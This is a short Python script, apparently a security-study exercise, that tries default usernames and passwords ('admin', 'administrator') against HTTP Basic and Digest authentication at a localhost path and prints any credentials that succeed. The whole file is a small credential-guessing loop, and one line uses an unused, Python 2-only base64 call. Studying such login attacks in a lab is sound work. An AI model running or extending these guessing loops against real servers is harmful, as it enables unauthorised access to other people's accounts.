# coding:utf-8
"""
@file: t_auth_mechanisms.py
@time: 11/17/2019 11:17 PM
@contact: dabuwang
"""

import base64
import requests
from requests.auth import HTTPDigestAuth


def http_basic_auth():
    """
    The main advantage is the ease of implementing it in Apache web servers,
    using standard Apache directives and the httpasswd utility.
    :return:
    """
    users = ['administrator', 'admin']
    passwords = ['administrator', 'admin']
    protectedResource = 'http://localhost/secured_path'
    foundPass = False
    for user in users:
        if foundPass:
            break
        for passwd in passwords:
            encoded = base64.encodestring(user + ':' + passwd)
            response = requests.get(protectedResource, auth=(user, passwd))
            if response.status_code != 401:
                print('User Found!')
                print('User: %s, Pass: %s' % (user, passwd))
                foundPass = True
                break


def http_digest_auth():
    """
    It is implemented in Apache web servers with the mod_auth_digest module and the htdigest utility.
    :return:
    """
    users = ['administrator', 'admin']
    passwords = ['administrator', 'admin']
    protectedResource = 'http://localhost/secured_path'
    foundPass = False
    for user in users:
        if foundPass:
            break
        for passwd in passwords:
            res = requests.get(protectedResource)
            if res.status_code == 401:
                resDigest = requests.get(protectedResource, auth=HTTPDigestAuth(user, passwd))
                if resDigest.status_code == 200:
                    print('User Found...')
                    print('User: ' + user + ' Pass: ' + passwd)
                    foundPass = True